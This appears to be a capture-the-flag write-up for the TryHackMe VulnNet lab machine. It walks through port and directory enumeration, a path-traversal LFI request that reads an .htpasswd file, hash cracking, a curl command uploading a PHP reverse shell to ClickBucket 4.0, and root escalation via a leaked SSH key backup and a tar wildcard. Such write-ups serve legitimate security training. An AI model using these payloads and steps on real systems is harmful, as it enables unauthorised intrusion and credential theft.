## üõ†Ô∏è Actions Taken  

### Port and Service Enumeration  

```bash
nmap -A -p- 10.10.45.143
```

| Port¬†¬†¬† | Service¬† | Description¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬† |
|---------|----------|--------------------------------|
| 22 | ssh¬†¬†¬† | OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)|¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬† |
| 80 | http¬†¬†¬†¬† | Apache httpd 2.4.29¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬†¬† |  


### Directory Enumeration  

```
gobuster dir -w /usr/share/wordlists/dirb/big.txt -u http://10.10.46.143/
```

‚Üí Found following directories  
  - /css
  - /img
  - /js

‚Üí In "/js" there were 2 javascript files, upon observing both  
  - index__7ed54732.js
    ```javascript
    function l(a) {
           
            return fetch(function(a) {
            
                return "".concat(void 0 === e ? "http://broadcast.vulnnet.thm" : e).concat("/", "?_alias=").concat(n, "&_callbackAlias=").concat(l, "&_lang=").concat(c)
            }
    ```
    - The code snippet mentioned another subdomain as "http://broadcast.vulnnet.thm".  
   

    - index__d8338055.js
      ```javascript
          return n.d(t, "a", t), t
            }, n.o = function(e, t) {
          return Object.prototype.hasOwnProperty.call(e, t)
        }, n.p = "http://vulnnet.thm/index.php?referer=", n(n.s = 0) }({
      ```
    - Found "referer" parameter which can lead to LFI.
   


### Local File Inclusion  

‚Üí Testing LFI  
  - Fuzzing the endpoint "http://vulnnet.thm/index.php?referer=" with LFI payloads using Burp with the payload
    ```
    GET /index.php?referer=%2e%2e%2F%2e%2e%2F%2e%2e%2F%2F%2e%2e%2F%2e%2e%2Fetc%2fapache2%2f.htpasswd HTTP/1.1
    Host: vulnnet.thm
    User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
    Accept-Language: en-US,en;q=0.5
    Accept-Encoding: gzip, deflate, br
    Connection: keep-alive
    Upgrade-Insecure-Requests: 1
    Priority: u=0, i
    ```
  - Received the contents of "/etc/passwd in response which confirmed LFI.


### Exploitation  

‚Üí Since apache was running in the machine, looking for "/etc/apache2/.htpasswd" returned a username and password hash.
  ```
      developers:$apr1$ntOz2ERF$Sd6FT8YVTValWjL7bJv0P0
  ```
‚Üí Successfully cracked the hash with john. Password => 9972761drmfsls.  
‚Üí Logging in with the credentials into the page "http://broadcast.vulnnet.thm/".  
‚Üí This revealed ClickBucket service running, with its version as 4.0.  
‚Üí Researching for the said version revealed that it's vulnerable. 
‚Üí Arbitrary File Upload  
  - The following payload results in file upload in the server.
    ```bash
    curl -F "file=@/home/kali/Downloads/tryhackme/shell.php" -F "plupload=1" -F "name=shell.php" "http://developers:9972761drmfsls@broadcast.vulnnet.thm/actions/beats_uploader.php"
    ```
    - Succesfuly uploaded the reverse shell.
    - Received the shell on the attacking machine succesfully.

### Post Exploitation  

‚Üí Got access as user "www-data".  
‚Üí Horizontal Privilege Escalation  
  - Upon inspecting crontab, found a script named "/var/opt/backupsrv.sh" scheduled to run.
  - The script has read/write/execute permissions set as root.  

    ```bash
    #!/bin/bash

    # Where to backup to.
    dest="/var/backups"
    
    # What to backup. 
    cd /home/server-management/Documents
    backup_files="*"
    
    # Create archive filename.
    day=$(date +%A)
    hostname=$(hostname -s)
    archive_file="$hostname-$day.tgz"
    
    # Print start status message.
    echo "Backing up $backup_files to $dest/$archive_file"
    date
    echo
    
    # Backup the files using tar.
    tar czf $dest/$archive_file $backup_files

    # Print end status message.
    echo
    echo "Backup finished"
    date

    ```

  - The script reveals interesting directories.
  - Checking the "/var/backups" direcotry, found an archive named "ssh-backup.tar.gz" owned by the user "server-management".
  - Copied the archive into a writable directory for user "www-data" that is "/tmp".
  - Extracted the archived via "tar -xzvf ssh-backup.tar.gz". It revealed a private ssh key.
  - Copied the key into the attacking machine and assigned the correct permissions via "chmod 600".
  - Upon doing ssh prompted for a passphrase, therefor generated the hash as "john key > key.hash".
  - Cracked the hash with john and found the passphrase.
  - Succesfully logged in as user "server-management" via ssh.


‚Üí Vertical privilege escalation  
  - In the script there is a wildcard entry mentioned.
    ```bash
    # What to backup. 
    cd /home/server-management/Documents
    backup_files="*"
    ```
  - Hence via using the methods mentioned in this (article):[https://www.hackingarticles.in/exploiting-wildcard-for-privilege-escalation/].
  - Succesfully received the root shell and obtained root flag.



## üîç Key Findings 

- Local File Inclusion
- Arbitrary File upload in ClickBucket application.
- Privilege escalation via wildcard entry.
